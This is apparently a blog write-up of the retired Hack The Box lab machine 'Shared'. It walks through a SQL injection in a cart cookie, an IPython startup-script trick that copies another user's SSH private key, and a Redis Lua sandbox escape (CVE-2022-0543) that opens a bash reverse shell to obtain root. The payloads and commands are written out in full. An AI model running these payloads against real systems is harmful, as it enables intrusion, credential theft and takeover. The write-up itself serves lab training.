---
layout: post
title: "HTB: Shared"
author: Andrew Cherney
date: 2023-04-26 19:52:08
tags: htb medium-box linux webapp sqli 
icon: "assets/icons/shared.png"
post_description: "SQLi, ipython, and Redis (oh my). This box starts off with fuzzing a store page to find an SQLi where you get the password for a user. Next that user has access to a script testing/reviewing directory which could be exploited to run commands at another user. The cherry on top is the redis sandbox escape after finding a binary which leaked the redis password."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $nmap -Pn 10.10.11.172
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-26 19:59 CDT
Nmap scan report for shared.htb (10.10.11.172)
Host is up (0.050s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/shared/front_page" alt="front_page" ext="png" trunc=600 %}

Seems this is some basic shop with essential functionality. I toss a couple items in my cart minding the url and parameters being passed. I see that on items there is a product id, a product attribute id, the item's name passed through a rewrite parameter, and a controller parameter which denotes product or cart.

![cart page](/img/shared/cart.png)

I head over to checkout and see that the checkout button goes to **checkout.shared.htb**. Quickly add that to my etc hosts file and try to checkout. 

![checkout page](/img/shared/checkout.png)

Before I begin fuzzing this page I make note that there are two cookies for the site. The first is a custom_cart cookie which holds JSON of the items I have and their quantity. The second seems to be encrypted, and although I found [this post about encryption vulnerabilities in PrestaShop](https://www.ambionics.io/blog/prestashop-privilege-escalation) I would rather save that for a last resort. 

<h1>User as james_mason</h1>

<h2>SQLi</h2>

Now onto burp suite and this credit card input. This payment portal isn't sending information and only returns a popup when clicking pay. But the product ID and quantity of items are controlled by a cookie here, meaning in theory I can inject some code into whatever handles the cookie information. 

I make a test cookie of %7B%22test%22%3A%221111%22%7D, which is **{"test":"1111"}** in json format. The response is Not Found from the product ID. I then try the payload **{"53GG2EF8' and '1'='1":"1111"}**, which to my surprise spits out the correct information. I mess around with some syntax and stumble across <code>{"53GG2EF8' and 1=1 union select null,null,null-- -":"1111"}</code> yielding a positive result. 

I refine my payload into the following <code>{"' and 1=1 union select null,version(),null-- -":"1111"}</code> where if I change where version() is I can inject my own queries. Now I can search for tables, read those tables, and hopefully find some credentials. 

```json
{"' and 1=1 union select null,database(),null-- -":"1111"}
Result: checkout

{"' and 1=1 union select null,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"} 
Result: user

{"' and 1=1 union select null,username,null from checkout.user-- -":"1111"}
Result: james_mason

{"' and 1=1 union select null,password,null from checkout.user where username = 'james_mason'-- -":"1111"}
Result: fc895d4eddc2fc12f995e18c865cf273
```

I toss that password into crackstation and got out **Soleil101**. Here's to praying ssh works. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $ssh james_mason@shared.htb
Last login: Thu Jul 14 14:45:22 2022 from 10.10.14.4
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
james_mason@shared:~$ cat user.txt
cat: user.txt: No such file or directory
```

<h1>User as dan_smith</h1>

<h2>ipython</h2>

First thing I notice is the developer group.

```bash
james_mason@shared:/home$ find / -group developer 2>/dev/null
/opt/scripts_review
james_mason@shared:/opt$ ls -al
total 12
drwxr-xr-x  3 root root      4096 Jul 14  2022 .
drwxr-xr-x 18 root root      4096 Jul 14  2022 ..
drwxrwx---  2 root developer 4096 Jul 14  2022 scripts_review
```

Seems I can edit files in this opt directory named scripts_review. I'll keep digging till I find why this directory exists. The tldr is that ipython probably uses it, ipython is run by either dan_smith or root (probably dan as ipython is in his home directory), and I found [this advisory about running code as another user](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x). If I create two directories named profile_default/startup then I can place scripts inside of the startup directory for them to run as dan_smith. 

```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default;mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo 'import os; os.system("cat ~/.ssh/id_rsa > /tmp/raccoon")' > /opt/scripts_review/profile_default/startup/foo.py
james_mason@shared:/opt/scripts_review$ cat /tmp/raccoon 
-----BEGIN OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $chmod 400 shared.key 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $ssh dan_smith@shared.htb -i shared.key 
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ cat user.txt
0f2a5ed8548---------------------
```

<h1>Root</h1>

<h2>Redis</h2>

In the id command we see I am a part of the sysadmin group, so round 2 for looking for files owned by a group. 

```bash
dan_smith@shared:/usr/local/bin$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:/usr/local/bin$ redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:4403
run_id:edb16a569462be765c207c082c946cc7d62d2f41
tcp_port:6379
uptime_in_seconds:13
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4843839
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

That file is a binary and I fear I need to sift through it with ghidra to determine what it does and how to exploit it. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $scp -i shared.key dan_smith@shared.htb:/usr/local/bin/redis_connector_dev .
```

Before I begin to dig through this I did decide try and run this on my local machine to see what information it sends out.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $nc -nvlp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60178
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

That looks suspiciously like a password at the bottom line. I'll try to login with this for the redis-cli.

```bash
dan_smith@shared:/usr/local/bin$ redis-cli -a F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> 
```

With an authenticated terminal in theory if this were vulnerable I could abuse it. I tossed a secret sequence of words to find a CVE: "redis rce poc github" and found [CVE-2022-0543 which is a Lua sandbox escape RCE](https://github.com/JacobEbben/CVE-2022-0543). I'll use a reverse shell to get root out of this rce.

```bash
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash -c \'bash -i >& /dev/tcp/10.10.14.5/7777 0>&1\'", "r"); local res = f:read("*a"); f:close(); return res' 0
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Shared]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.172] 59620
bash: cannot set terminal process group (5550): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis# id
id
uid=0(root) gid=0(root) groups=0(root)
root@shared:/var/lib/redis# cat /root/root.txt
cat /root/root.txt
256c100c5-----------------------
```

